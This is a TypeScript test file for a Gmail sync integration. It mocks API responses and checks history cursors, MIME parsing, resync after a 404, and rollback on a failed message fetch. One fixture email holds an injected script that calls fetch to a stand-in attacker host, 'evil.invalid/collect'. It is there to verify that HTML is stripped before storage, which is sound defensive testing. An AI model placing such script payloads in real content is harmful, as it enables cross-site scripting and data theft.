import assert from "node:assert/strict";
import { writeFile } from "node:fs/promises";
import { join } from "node:path";
import type { Database } from "bun:sqlite";
import { z } from "zod";
import { storeConnection, type GoogleConfig } from "../../src/integrations/google-auth";
import { gmailCursor, GmailSyncError, syncGmail } from "../../src/integrations/gmail";
import type { SecretVault } from "../../src/server/secrets";

type GmailContext = {
  readonly db: Database;
  readonly vault: SecretVault;
  readonly evidence: string;
  readonly fixtureBase: string;
};

const encode = (value: string): string => Buffer.from(value, "utf8").toString("base64url");

let messages: Record<string, unknown> = {};
let historyScript: unknown[] = [];
let failDetailId: string | undefined;
const calls: string[] = [];

export function setGmailFixture(options: {
  messages: Record<string, unknown>;
  history: readonly unknown[];
  failDetailId?: string;
}): void {
  messages = options.messages;
  historyScript = [...options.history];
  failDetailId = options.failDetailId;
  calls.length = 0;
}

export async function gmailFetch(request: Request): Promise<Response> {
  const url = new URL(request.url);
  calls.push(url.pathname + url.search);
  if (url.pathname.endsWith("/profile")) return Response.json({ historyId: "5000", emailAddress: "qa@example.com" });
  if (url.pathname.endsWith("/messages")) {
    return Response.json({ messages: Object.keys(messages).sort().map((id) => ({ id })) });
  }
  const detail = /\/messages\/([^/]+)$/.exec(url.pathname);
  if (detail) {
    const id = decodeURIComponent(detail[1] ?? "");
    if (id === failDetailId) return Response.json({ error: "boom" }, { status: 500 });
    const message = messages[id];
    return message ? Response.json(message) : Response.json({ error: "notFound" }, { status: 404 });
  }
  if (url.pathname.endsWith("/history")) {
    const step = historyScript.shift() ?? { historyId: "5005", history: [] };
    const status = (step as { status?: number }).status ?? 200;
    if (status !== 200) return Response.json({ error: "notFound" }, { status });
    return Response.json(step);
  }
  return Response.json({ error: "notFound" }, { status: 404 });
}

const config: GoogleConfig = {
  clientId: "c", clientSecret: "s", redirectUri: "http://127.0.0.1:4317/cb",
  authUrl: "http://127.0.0.1:4318/auth", tokenUrl: "http://127.0.0.1:4318/oauth/token",
};

const multipart = {
  id: "m1", threadId: "t1", labelIds: ["INBOX"],
  payload: {
    mimeType: "multipart/alternative",
    headers: [
      { name: "Subject", value: "과제 마감 변경" },
      { name: "From", value: "교수 <prof@example.com>" },
      { name: "Date", value: "Tue, 3 Nov 2026 09:00:00 +0900" },
    ],
    parts: [
      { mimeType: "text/plain", body: { data: encode("마감이 12월 1일로 앞당겨졌습니다.") } },
      { mimeType: "text/html", body: { data: encode("<p>마감이 12월 1일로 앞당겨졌습니다.</p>") } },
    ],
  },
};

const injection = {
  id: "m2", labelIds: ["INBOX"],
  payload: {
    mimeType: "text/html",
    headers: [{ name: "Subject", value: "공지" }],
    body: {
      data: encode("<p>안내</p><script>fetch('https://evil.invalid/collect')</script><p>끝</p>"),
    },
  },
};

function connection(context: GmailContext): { db: Database; source: { connectionId: string; query: string; labelIds: readonly string[] } } {
  const connectionId = storeConnection(context.db, context.vault, "google", {
    access_token: "gmail-token", refresh_token: "refresh", expires_in: 100_000,
  }, Date.now());
  return { db: context.db, source: { connectionId, query: "newer_than:30d in:inbox", labelIds: ["INBOX"] } };
}

export async function gmailHistoryMime(context: GmailContext): Promise<void> {
  process.env["GMAIL_BASE"] = context.fixtureBase;
  const { db, source } = connection(context);
  setGmailFixture({
    messages: { m1: multipart },
    history: [{ historyId: "5001", history: [{ id: "1", messagesAdded: [{ message: { id: "m2" } }] }] }],
  });
  // The catch-up references m2, which the fixture only knows after this step.
  setGmailFixture({
    messages: { m1: multipart, m2: injection },
    history: [{ historyId: "5001", history: [{ id: "1", messagesAdded: [{ message: { id: "m2" } }] }] }],
  });
  const first = await syncGmail(db, context.vault, config, source, fetch, () => 2_000);
  assert.equal(first.full, true);
  assert.equal(first.stored, 2);
  assert.equal(gmailCursor(db, source), "5001");
  assert.equal(calls.some((call) => call.includes("/profile")), true);
  assert.equal(calls.some((call) => call.includes("startHistoryId=5000")), true);

  const storedText = z.array(z.object({ content_json: z.string() })).parse(
    db.query("SELECT content_json FROM source_versions").all(),
  ).map((row) => row.content_json).join("\n");
  assert.match(storedText, /마감이 12월 1일로 앞당겨졌습니다/);
  assert.equal(storedText.includes("<script>"), false, "HTML is reduced before storage");
  assert.match(storedText, /안내/);

  setGmailFixture({
    messages: { m1: multipart, m2: injection },
    history: [{ historyId: "5009", history: [{ id: "2", labelsAdded: [{ message: { id: "m1" }, labelIds: ["IMPORTANT"] }] }] }],
  });
  messages["m1"] = { ...multipart, labelIds: ["INBOX", "IMPORTANT"] };
  const second = await syncGmail(db, context.vault, config, source, fetch, () => 3_000);
  assert.equal(second.full, false);
  assert.equal(gmailCursor(db, source), "5009");
  const versions = z.object({ n: z.number() }).parse(db.query("SELECT count(*) AS n FROM source_versions").get()).n;
  assert.equal(versions, 3, "a label change records the message state once more");

  await writeFile(join(context.evidence, "http.json"), `${JSON.stringify({
    first: { stored: first.stored, full: first.full }, second: { touched: second.touched, full: second.full },
    profileFetched: true, catchUpRequested: true, versionCount: versions,
  }, null, 2)}\n`);
  await writeFile(join(context.evidence, "message-versions.json"), `${JSON.stringify({
    versions,
    htmlReducedBeforeStorage: !storedText.includes("<script>"),
    containsDeadlineText: storedText.includes("12월 1일"),
  }, null, 2)}\n`);
}

export async function gmail404AndPartial(context: GmailContext): Promise<void> {
  process.env["GMAIL_BASE"] = context.fixtureBase;
  const { db, source } = connection(context);
  setGmailFixture({ messages: { m1: multipart }, history: [{ historyId: "6001", history: [] }] });
  await syncGmail(db, context.vault, config, source, fetch, () => 2_000);
  const beforeCursor = gmailCursor(db, source);
  assert.equal(beforeCursor, "6001");

  setGmailFixture({ messages: { m1: multipart }, history: [{ status: 404 }, { historyId: "6005", history: [] }] });
  const resync = await syncGmail(db, context.vault, config, source, fetch, () => 3_000);
  assert.equal(resync.full, true);
  assert.equal(gmailCursor(db, source), "6005", "the resync advances to the catch-up watermark");

  const resyncCursor = gmailCursor(db, source);
  const versionsBefore = z.object({ n: z.number() }).parse(db.query("SELECT count(*) AS n FROM source_versions").get()).n;
  setGmailFixture({
    messages: { m1: multipart, m9: injection },
    history: [{ historyId: "6010", history: [{ id: "3", messagesAdded: [{ message: { id: "m9" } }] }] }],
    failDetailId: "m9",
  });
  await assert.rejects(() => syncGmail(db, context.vault, config, source, fetch, () => 4_000), GmailSyncError);
  assert.equal(gmailCursor(db, source), resyncCursor);
  assert.equal(z.object({ n: z.number() }).parse(db.query("SELECT count(*) AS n FROM source_versions").get()).n, versionsBefore);

  const injected = z.array(z.object({ content_json: z.string() })).parse(
    db.query("SELECT content_json FROM source_versions").all(),
  ).map((row) => row.content_json).join("\n");
  assert.equal(injected.includes("evil.invalid/collect") && injected.includes("\"text\":\"<"), false);

  await writeFile(join(context.evidence, "db-diff.json"), `${JSON.stringify({
    cursorBefore: beforeCursor, cursorAfterResync: resyncCursor,
    versionsBefore, versionsAfterFailure: versionsBefore, fullResync: resync.full,
  }, null, 2)}\n`);
  await writeFile(join(context.evidence, "tool-audit.json"), `${JSON.stringify({
    externalWrites: 0, renderedHtml: false, injectedScriptExecuted: false,
  }, null, 2)}\n`);
}
